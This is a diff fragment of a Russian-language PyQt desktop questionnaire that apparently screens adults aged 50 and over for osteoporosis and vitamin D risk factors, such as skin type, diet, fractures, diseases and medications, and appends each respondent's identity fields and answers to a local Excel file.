+        self.gender_input.addItems(["М", "Ж"])
+        self.gender_input.currentIndexChanged.connect(self.on_combobox_changed)
+
+        self.height_input = QLineEdit()
+        self.height_input.setValidator(QIntValidator(120, 210, self))
+
+        self.region = QComboBox()
+        self.region.addItems(["Бурятия", "Татарстан", "Кабардино-Балкария", "Челябинская область", "Томская область", "Рязанская область"])
+
+        # Add fields to layout
+        self.form_layout.addRow("Регион:", self.region)
+        self.form_layout.addRow("СНИЛС:", self.snils_input)
+        self.form_layout.addRow("ФИО:", self.fio_input)
+        self.form_layout.addRow("Телефон:", self.phone_input)
+        self.form_layout.addRow("Возраст:", self.age_input)
+        self.form_layout.addRow("Пол:", self.gender_input)
+        self.form_layout.addRow("Рост:", self.height_input)
+        self.form_layout.addRow("Вес:", self.weight_input)
+
+        self.layout.addLayout(self.form_layout)
+
+        # Create stacked widget for questions
+        self.stacked_widget = QStackedWidget()
+
+        self.questions_layout = QVBoxLayout()
+        self.first_question = QComboBox()
+        self.first_question.addItems(["Очень светлая кожа, есть веснушки, быстро «сгораю» на солнце", "Светлая кожа цвета «слоновой кости», медленно загораю, но кожа легко краснеет на солнце", 
+                                      "Светлая кожа цвета «слоновой кости», загар проявляется постепенно и равномерно", "Кожа оливкового оттенка, практически не обгорает, загар ложится равномерно и интенсивно ", 
+                                      "Смуглая или темно-коричневая кожа, редко обгорает, загар проявляется насыщенным темным оттенком", "Очень смуглая кожа шоколадного оттенка с низкой чувствительностью к ультрафиолету: никогда не обгорает, загар очень темный"])
+        self.questions_layout.addWidget(QLabel("2. Как бы Вы охарактеризовали свой тип кожи?"))
+        self.questions_layout.addWidget(self.first_question)
+       
+        self.questions = []
+        self.list_of_texts = []
+
+        text = "1. Курите ли Вы в настоящее время?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        self.questions.append(self.questions_layout)
+        self.list_of_texts.append("2. Как бы Вы охарактеризовали свой тип кожи?")
+        text = "3. Используете ли Вы косметические средства (например, крема, спреи) с солнцезащитными факторами (SPF) на регулярной основе?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget_with_only(text))
+        text = "4. Сколько минут в день в среднем вы проводите на улице?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_sun_question_widget(text))
+        text = "5. Посещаете ли Вы солярий?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "6. Употребляете ли Вы в настоящее время более 1 бокала вина (120 мл) или 1 бокала пива (285 г) или 30 мл крепкого спиртного в день?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "7. Присутствуют ли в Вашем рационе цельное молоко – минимум 1 порция в сутки?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "8. Присутствуют ли в Вашем рационе иные молочные продукты – минимум 2 порции в неделю?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "9. Присутствуют ли в Вашем рационе рыба – минимум 3 порции в неделю?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "10. Присутствуют ли в Вашем рационе яйца – минимум 2 штуки в неделю?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "11. Уменьшился ли Ваш рост более чем на 4 см за жизнь?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "12. Уменьшился ли Ваш рост более чем на 2 см за прошедший год?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "13. Были ли у Вас во взрослом возрасте переломы костей, произошедшие самопроизвольно или в результате такой травмы, от которой у обычного человека перелом бы не возник?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "14. Был ли у кого-то из Ваших родителей перелом шейки бедра?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget_with_idk(text))
+        text = "15. Беспокоят ли Вас жажда, частое ночное мочеиспускание?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "16. Были ли у Вас в течение жизни язвы и/или эрозии желудка или двенадцатиперстной кишки?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget_with_idk(text))
+        text = "17. Обнаруживались ли у Вас когда-либо камни или «песок» в почках? Были ли почечные колики?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget_with_idk(text))
+        text = "18. Были ли у Вас операции на органах шеи?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "19. Страдаете ли Вы или страдали ранее какими-либо из нижеперечисленных заболеваний?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_simple_question_widget(text))
+        text = "Ревматоидный артрит"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Болезнь Крона, язвенный колит, целиакия"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Сахарный диабет"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Тиреотоксикоз, гипертиреоз"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Рак простаты (для мужчин)"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Рак молочной железы (для женщин)"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Менопауза до 45 лет (в том числе, операции по удалению яичников) (для женщин)"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Гипогонадизм (для мужчин)"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Хроническое заболевание печени"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Хроническое заболевание почек"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Хроническая обструктивная болезнь легких или иное хроническое заболевание легких"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "ВИЧ"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Вынужденное снижение двигательной активности"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "20. Принимаете ли Вы в настоящее время или принимали ли Вы когда-либо глюкокортикоиды («стероиды») в течение 3 месяцев и более?"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget_with_idk(text))
+        text = "21. Принимаете ли Вы в настоящее время или принимали в течение последнего года препараты из этих групп:"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_simple_question_widget(text))
+        text = "Антиконвульсанты (вальпроат натрия, карбамазепин, этосуксимид, ламотриджин, топирамат, леветирацетам и др.)"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Антипсихотики (галоперидол, арипипразол, брекспипразол, кветиапин, клозапин, оланзапин, амисульприд, перфеназин, хлорпромазин, хлорпротиксен и др.)"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Антиретровирусные препараты (зиновудин, ламивудин, тенофовир, фосфазид, эфавиренз, этравирин, индинавир, фосампренавир, дарунавир, абакавир, эмтрицитабин, лопинавир, ритонавир, фостемсавир, маравирок и др.)"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Препараты для снижения массы тела (орлистат, сибутрамин, лираглутид, семаглутид)"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Препараты для снижения холестерина (статины, эзетимиб, эволокумаб)"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Слабительные"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+        text = "Лекарственные препараты и/или БАДы с витамином D"
+        self.list_of_texts.append(text)
+        self.questions.append(self.create_question_widget(text))
+
+        self.questions[24].itemAt(1).widget().setDisabled(True)
+        self.questions[24].itemAt(2).widget().setDisabled(True)
+        self.questions[25].itemAt(1).widget().setDisabled(True)
+        self.questions[25].itemAt(2).widget().setDisabled(True)
+        self.questions[23].itemAt(1).widget().setDisabled(False)
+        self.questions[23].itemAt(2).widget().setDisabled(False) 
+        self.questions[26].itemAt(1).widget().setDisabled(False)
+        self.questions[26].itemAt(2).widget().setDisabled(False)
+        
+
+        # Create pages with 5 questions each
+        for i in range(0, len(self.questions), 6):
+            page_layout = QVBoxLayout()
+            for j in range(i, min(i + 6, len(self.questions))):
+                page_layout.addLayout(self.questions[j])
+
+            page_widget = QWidget()
+            page_widget.setLayout(page_layout)
+            self.stacked_widget.addWidget(page_widget)
+
+        self.layout.addWidget(self.stacked_widget)
+
+        # Navigation buttons
+        self.nav_layout = QHBoxLayout()
+        self.prev_button = QPushButton("Назад")
+        self.next_button = QPushButton("Далее")
+        self.prev_button.clicked.connect(self.go_to_previous_page)
+        self.next_button.clicked.connect(self.go_to_next_page)
+
+        self.nav_layout.addWidget(self.prev_button)
+        self.nav_layout.addWidget(self.next_button)
+        self.layout.addLayout(self.nav_layout)
+
+        # Submit button (only visible on last page)
+        self.submit_button = QPushButton("Выгрузить в Excel")
+        self.submit_button.clicked.connect(self.export_to_excel)
+        self.layout.addWidget(self.submit_button)
+        self.submit_button.hide()
+
+        self.setLayout(self.layout)
+        self.update_navigation()
+
+    def focusOutEvent(self, event):
+        text = self.age_input.text()
+        if text:
+            value = int(text)
+            if value < 50 or value > 99:
+                self.age_input.setText('50')
+        super().focusOutEvent(event)
+
+    def check_value(self):
+        text = self.age_input.text()
+        if text:
+            value = int(text)
+            if value < 50 or value > 99:
+                self.age_input.setText('50')
+
+    def create_simple_question_widget(self, question_text):
+        question_label = QLabel(question_text)
+        question_layout = QVBoxLayout()
+        question_layout.addWidget(question_label)
+        return question_layout
+    
+    def create_sun_question_widget(self, question_text):
+        question_label = QLabel(question_text)
+        question_layout = QVBoxLayout()
+        min_input = QLineEdit()
+        min_input.setValidator(QIntValidator(0, 960, self))
+        question_layout.addWidget(question_label)
+        question_layout.addWidget(min_input)
+        return question_layout
+
+    def create_question_widget(self, question_text):
+        question_label = QLabel(question_text)
+        yes_checkbox = QCheckBox("Да")
+        no_checkbox = QCheckBox("Нет")
+
+        # Ensure mutual exclusivity
+        yes_checkbox.stateChanged.connect(lambda state, n=no_checkbox: n.setChecked(False))
+        no_checkbox.stateChanged.connect(lambda state, y=yes_checkbox: y.setChecked(False))
+
+        question_layout = QVBoxLayout()
+        question_layout.addWidget(question_label)
+        question_layout.addWidget(yes_checkbox)
+        question_layout.addWidget(no_checkbox)
+
+        return question_layout
+    
+    def create_question_widget_with_idk(self, question_text):
+        question_label = QLabel(question_text)
+        yes_checkbox = QCheckBox("Да")
+        no_checkbox = QCheckBox("Нет")
+        idk_checkbox = QCheckBox("Не знаю")
+
+        # Ensure mutual exclusivity
+        yes_checkbox.stateChanged.connect(lambda state, n=no_checkbox: n.setChecked(False))
+        yes_checkbox.stateChanged.connect(lambda state, idk=idk_checkbox: idk.setChecked(False))
+        no_checkbox.stateChanged.connect(lambda state, y=yes_checkbox: y.setChecked(False))
+        no_checkbox.stateChanged.connect(lambda state, idk=idk_checkbox: idk.setChecked(False))
+        idk_checkbox.stateChanged.connect(lambda state, n=no_checkbox: n.setChecked(False))
+        idk_checkbox.stateChanged.connect(lambda state, y=yes_checkbox: y.setChecked(False))
+
+        question_layout = QVBoxLayout()
+        question_layout.addWidget(question_label)
+        question_layout.addWidget(yes_checkbox)
+        question_layout.addWidget(no_checkbox)
+        question_layout.addWidget(idk_checkbox)
+
+        return question_layout
+    
+    def create_question_widget_with_only(self, question_text):
+        question_label = QLabel(question_text)
+        yes_checkbox = QCheckBox("Да")
+        no_checkbox = QCheckBox("Нет")
+        only_checkbox = QCheckBox("Только летом")
+
+        # Ensure mutual exclusivity
+        yes_checkbox.stateChanged.connect(lambda state, n=no_checkbox: n.setChecked(False))
+        yes_checkbox.stateChanged.connect(lambda state, idk=only_checkbox: idk.setChecked(False))
+        no_checkbox.stateChanged.connect(lambda state, y=yes_checkbox: y.setChecked(False))
+        no_checkbox.stateChanged.connect(lambda state, idk=only_checkbox: idk.setChecked(False))
+        only_checkbox.stateChanged.connect(lambda state, n=no_checkbox: n.setChecked(False))
+        only_checkbox.stateChanged.connect(lambda state, y=yes_checkbox: y.setChecked(False))
+
+        question_layout = QVBoxLayout()
+        question_layout.addWidget(question_label)
+        question_layout.addWidget(yes_checkbox)
+        question_layout.addWidget(no_checkbox)
+        question_layout.addWidget(only_checkbox)
+
+        return question_layout
+
+    def go_to_previous_page(self):
+        current_index = self.stacked_widget.currentIndex()
+        if current_index > 0:
+            self.stacked_widget.setCurrentIndex(current_index - 1)
+        self.update_navigation()
+
+    def go_to_next_page(self):
+        current_index = self.stacked_widget.currentIndex()
+        if current_index < self.stacked_widget.count() - 1:
+            self.stacked_widget.setCurrentIndex(current_index + 1)
+        self.update_navigation()
+
+    def update_navigation(self):
+        current_index = self.stacked_widget.currentIndex()
+        self.prev_button.setEnabled(current_index > 0)
+        self.next_button.setEnabled(current_index < self.stacked_widget.count() - 1)
+        self.submit_button.setVisible(current_index == self.stacked_widget.count() - 1)
+
+    def check_empty(self):
+         QMessageBox.information(self, "Warning!", "Заполните все поля!")
+         self.is_empty = True
+    
+    def on_combobox_changed(self):
+        if self.gender_input.currentText() == "Ж":
+            self.questions[23].itemAt(1).widget().setDisabled(True)
+            self.questions[23].itemAt(2).widget().setDisabled(True) 
+            self.questions[26].itemAt(1).widget().setDisabled(True)
+            self.questions[26].itemAt(2).widget().setDisabled(True)
+            self.questions[24].itemAt(1).widget().setDisabled(False) 
+            self.questions[24].itemAt(2).widget().setDisabled(False)
+            self.questions[25].itemAt(1).widget().setDisabled(False)
+            self.questions[25].itemAt(2).widget().setDisabled(False)
+            self.gender_f = True
+            self.gender_m = False
+        else:
+            self.questions[24].itemAt(1).widget().setDisabled(True)
+            self.questions[24].itemAt(2).widget().setDisabled(True)
+            self.questions[25].itemAt(1).widget().setDisabled(True)
+            self.questions[25].itemAt(2).widget().setDisabled(True)
+            self.questions[23].itemAt(1).widget().setDisabled(False)
+            self.questions[23].itemAt(2).widget().setDisabled(False) 
+            self.questions[26].itemAt(1).widget().setDisabled(False)
+            self.questions[26].itemAt(2).widget().setDisabled(False)
+            self.gender_f = False
+            self.gender_m = True
+        
+
+    def export_to_excel(self):
+        # Collect user data
+        if self.snils_input.text():
+            if self.fio_input.text():
+                if self.phone_input.text():
+                    if self.age_input.text():
+                        if self.height_input.text():
+                            if self.weight_input.text():
+                                user_data = [
+                                    self.region.currentText(),
+                                    self.snils_input.text(),
+                                    self.fio_input.text(),
+                                    self.phone_input.text(),
+                                    self.age_input.text(),
+                                    self.gender_input.currentText(),
+                                    self.height_input.text(),
+                                    self.weight_input.text()
+                                ]
+                            else:
+                                self.check_empty()
+                                if self.is_empty:
+                                    self.is_empty = False
+                                    return
+                        else:
+                                self.check_empty()
+                                if self.is_empty:
+                                    self.is_empty = False
+                                    return
+                    else:
+                                self.check_empty()
+                                if self.is_empty:
+                                    self.is_empty = False
+                                    return
+                else:
+                                self.check_empty()
+                                if self.is_empty:
+                                    self.is_empty = False
+                                    return
+            else:
+                                self.check_empty()
+                                if self.is_empty:
+                                    self.is_empty = False
+                                    return
+        else:
+                                self.check_empty()
+                                if self.is_empty:
+                                    self.is_empty = False
+                                    return
+
+        # Collect responses
+        question_data = []
+        counter = 0
+        for question_layout in self.questions:
+            counter = counter + 1
+            try:
+                yes_checkbox = question_layout.itemAt(1).widget()
+                no_checkbox = question_layout.itemAt(2).widget()
+                idk_checkbox = question_layout.itemAt(3).widget()
+                if idk_checkbox.text() == "Только летом":
+                    question_data.append("Да" if yes_checkbox.isChecked() else "Нет" if no_checkbox.isChecked() else "Только летом" if idk_checkbox.isChecked() else self.check_empty())
+                    if self.is_empty:
+                        self.is_empty = False
+                        return
+                else:
+                    question_data.append("Да" if yes_checkbox.isChecked() else "Нет" if no_checkbox.isChecked() else "Не знаю" if idk_checkbox.isChecked() else self.check_empty())
+                    if self.is_empty:
+                        self.is_empty = False
+                        return
+            except:
+                try:
+                    if counter == 25 or counter == 26 or counter == 24 or counter == 27:
+                        if self.gender_m:
+                            if counter == 25 or counter == 26:
+                                question_data.append("")
+                            else:
+                                yes_checkbox = question_layout.itemAt(1).widget()
+                                no_checkbox = question_layout.itemAt(2).widget()
+                                question_data.append("Да" if yes_checkbox.isChecked() else "Нет" if no_checkbox.isChecked() else self.check_empty())
+                                if self.is_empty:
+                                    self.is_empty = False
+                                    return                            
+                        if self.gender_f:
+                            if counter == 24 or counter == 27:
+                                question_data.append("")
+                            else:
+                                yes_checkbox = question_layout.itemAt(1).widget()
+                                no_checkbox = question_layout.itemAt(2).widget()
+                                question_data.append("Да" if yes_checkbox.isChecked() else "Нет" if no_checkbox.isChecked() else self.check_empty())
+                                if self.is_empty:
+                                    self.is_empty = False
+                                    return
+                    else:                           
+                        yes_checkbox = question_layout.itemAt(1).widget()
+                        no_checkbox = question_layout.itemAt(2).widget()
+                        question_data.append("Да" if yes_checkbox.isChecked() else "Нет" if no_checkbox.isChecked() else self.check_empty())
+                        if self.is_empty:
+                            self.is_empty = False
+                            return
+                except:
+                    try:
+                        yes_checkbox = question_layout.itemAt(1).widget()
+                        question_data.append(yes_checkbox.currentText())
+                    except:
+                        try:
+                            yes_checkbox = question_layout.itemAt(1).widget()
+                            if yes_checkbox.text():
+                                question_data.append(yes_checkbox.text())
+                            else:
+                                self.check_empty()
+                                if self.is_empty:
+                                    self.is_empty = False
+                                    return
+                        except:                        
+                            question_data.append("")
+        counter = 0
+            
+
+        # Save to Excel
+        num_rows = ["1"]
+        
+        if os.path.exists(EXCEL_FILE):
+            workbook = load_workbook(EXCEL_FILE)
+            sheet = workbook.active
+            num_rows[0] = sheet.max_row
+        else:
+            workbook = Workbook()
+            sheet = workbook.active
+            # Create headers
+            headers = ["№", "Регион", "СНИЛС", "ФИО", "Телефон", "Возраст", "Пол", "Рост", "Вес"] + [i for i in self.list_of_texts]
+            sheet.append(headers)
+        
+        
+        sheet.append(num_rows + user_data + question_data)
+        try:
+            workbook.save(EXCEL_FILE)
+            QMessageBox.information(self, "Успех", "Данные успешно выгружены в Excel!")
+            self.return_to_main()
+        except:
+            QMessageBox.information(self, "Warning!", "Перед сохранением закройте файл Excel!")
+           
+    def return_to_main(self):
+        self.main_window = MainWindow()
+        self.main_window.show()
+        self.close()
+
+if __name__ == "__main__":
+    app = QApplication(sys.argv)
+
+    main_window = MainWindow()
+    main_window.show()
+
+    sys.exit(app.exec_())
